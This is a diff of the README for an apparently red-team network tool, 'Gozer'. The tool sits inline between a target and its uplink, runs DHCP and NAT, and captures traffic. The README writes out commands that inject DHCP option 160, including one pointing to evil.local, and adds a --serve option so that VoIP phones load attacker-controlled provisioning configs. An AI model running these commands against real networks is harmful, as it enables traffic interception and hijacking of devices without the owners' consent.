@@ -1,68 +1,78 @@
-# Gozer  
-  
-Gozer is an inline transparent tap that drops between a target and their uplink, stands up DHCP on the victim side, NATs everything through, and optionally captures traffic. Replaces a bunch of half-baked scripts I had lying around for doing this manually.  
-  
-Requires two NICs. Figures out which one has the default route (uplink) and uses the other for the victim net. If it can't tell, it will ask.  
-  
-## Usage  
-  
-```  
-sudo python3 gozer.py  
-```  
-  
-The basic use case will auto-detect available interfaces, pick a subnet, start DHCP, enable forwarding, set up NAT, and kick off tcpdump. Ctrl-C tears  
-everything down and restores your iptables/sysctl state.  
-  
-## Options  
-  
-```  
---uplink IF        override uplink interface detection  
---victim IF        override victim interface detection  
---subnet CIDR      dhcp subnet (default: 10.66.66.0/24)  
---dns IP           dns server to hand out (default: whatever's in resolv.conf)  
---pool-start IP    first IP in dhcp pool (default: .100)  
---pool-end IP      last IP in dhcp pool (default: .200)  
---no-capture       don't start tcpdump  
---capture-filter   bpf filter string for tcpdump  
---recon            passive recon mode (scapy-based traffic analysis)  
---recon-only       recon only, no DHCP/NAT setup  
---dhcp-option N:V  inject a custom dhcp option (repeatable)  
--v                 verbose logging  
-```  
-  
-## DHCP Option Injection  
-  
-The `--dhcp-option` flag lets you stuff arbitrary options into DHCP responses. Format is `CODE:VALUE`.  
-  
-Similar techniques were used during a Polycom provisioning hijack (option 160) in past operations:  
-  
-```  
-sudo python3 gozer.py --dhcp-option 160:http://evil.local/cfg  
-```  
-  
-In this scenario, a victim phone grabs a DHCP lease, gets told to pull its config from your server instead of the real provisioning host. Works for any protocol that bootstraps via DHCP options.  
+![Gozer](gozer.png)
 
-## Recon Mode  
-  
-`--recon` enables passive traffic analysis alongside the normal MitM flow. Sniffs the victim interface and flags discovery/provisioning protocols as devices come online:  
-  
-```  
-sudo python3 gozer.py --recon  
-```  
-  
-Recon detects CDP, LLDP, DHCP provisioning options, DNS patterns, HTTP provisioning paths, SIP, and TLS SNI. Built-in signatures for Polycom, Cisco, Yealink, Grandstream, Snom, Audiocodes, Mitel, and Ubiquiti devices.  
-  
-`--recon-only` skips the DHCP/NAT setup entirely and just does passive sniffing for whatever's already on the wire.
+# Gozer
 
-## How It Works  
-  
-1. Detects uplink (has default route) vs victim (no route) NIC  
-2. Assigns an IP to the victim interface  
-3. Starts a bare-bones DHCP server on the victim side  
-4. Enables ip_forward and sets up iptables MASQUERADE  
-5. Optionally starts tcpdump on the victim interface  
-6. On exit, reverts everything (iptables rules, ip_forward, interface config)  
-  
-The DHCP server (`lib/dhcpd.py`) handles DISCOVER/OFFER/REQUEST/ACK verbs. Lease tracking is minimal since victims are usually transient in scenarios that the tool is used in.  
-  
+Gozer is an inline transparent tap that drops between a target and their uplink, stands up DHCP on the victim side, NATs everything through, and optionally captures traffic. Replaces a bunch of half-baked scripts I had lying around for doing this manually.
 
+Requires two NICs. Figures out which one has the default route (uplink) and uses the other for the victim net. If it can't tell, it will ask.
+
+## Usage
+
+```
+sudo python3 gozer.py
+```
+
+The basic use case will auto-detect available interfaces, pick a subnet, start DHCP, enable forwarding, set up NAT, and kick off tcpdump. Ctrl-C tears everything down and restores your iptables/sysctl state.
+
+## Options
+
+```
+--uplink IF        override uplink interface detection
+--victim IF        override victim interface detection
+--subnet CIDR      dhcp subnet (default: 10.66.66.0/24)
+--dns IP           dns server to hand out (default: whatever's in resolv.conf)
+--pool-start IP    first IP in dhcp pool (default: .100)
+--pool-end IP      last IP in dhcp pool (default: .200)
+--no-capture       don't start tcpdump
+--capture-filter   bpf filter string for tcpdump
+--recon            passive recon mode (scapy-based traffic analysis)
+--recon-only       recon only, no DHCP/NAT setup
+--serve DIR        serve provisioning files from DIR over HTTP
+--dhcp-option N:V  inject a custom dhcp option (repeatable)
+-v                 verbose logging
+```
+
+## DHCP Option Injection
+
+The `--dhcp-option` flag lets you stuff arbitrary options into DHCP responses. Format is `CODE:VALUE`.
+
+Similar techniques were used during a Polycom provisioning hijack (option 160) in past operations:
+
+```
+sudo python3 gozer.py --dhcp-option 160:http://evil.local/cfg
+```
+
+In this scenario, a victim phone grabs a DHCP lease, gets told to pull its config from your server instead of the real provisioning host. Works for any protocol that bootstraps via DHCP options.
+
+## Recon Mode
+
+`--recon` enables passive traffic analysis alongside the normal MitM flow. Sniffs the victim interface and flags discovery/provisioning protocols as devices come online:
+
+```
+sudo python3 gozer.py --recon
+```
+
+Detects CDP, LLDP, DHCP provisioning options, DNS patterns, HTTP provisioning paths, SIP, and TLS SNI. Built-in signatures for Polycom, Cisco, Yealink, Grandstream, Snom, Audiocodes, Mitel, and Ubiquiti.
+
+`--recon-only` skips the DHCP/NAT setup entirely - just passive sniffing on whatever's already on the wire.
+
+## Provisioning Server
+
+`--serve` starts an HTTP server that serves files from a directory. Pair it with `--dhcp-option` to redirect a device's provisioning flow:
+
+```
+sudo python3 gozer.py --recon --serve ./provision --dhcp-option 160:http://10.66.66.1/
+```
+
+The device picks up option 160 from DHCP, requests its config from your server, and you serve whatever you want. Use recon output to see exactly which files the device asks for.
+
+## How It Works
+
+1. Detects uplink (has default route) vs victim (no route) NIC
+2. Assigns an IP to the victim interface
+3. Starts a bare-bones DHCP server on the victim side
+4. Enables ip_forward and sets up iptables MASQUERADE
+5. Optionally starts tcpdump on the victim interface
+6. On exit, reverts everything (iptables rules, ip_forward, interface config)
+
+The DHCP server (`lib/dhcpd.py`) handles DISCOVER/OFFER/REQUEST/ACK verbs. Lease tracking is minimal since victims are usually transient in scenarios that the tool is used in.
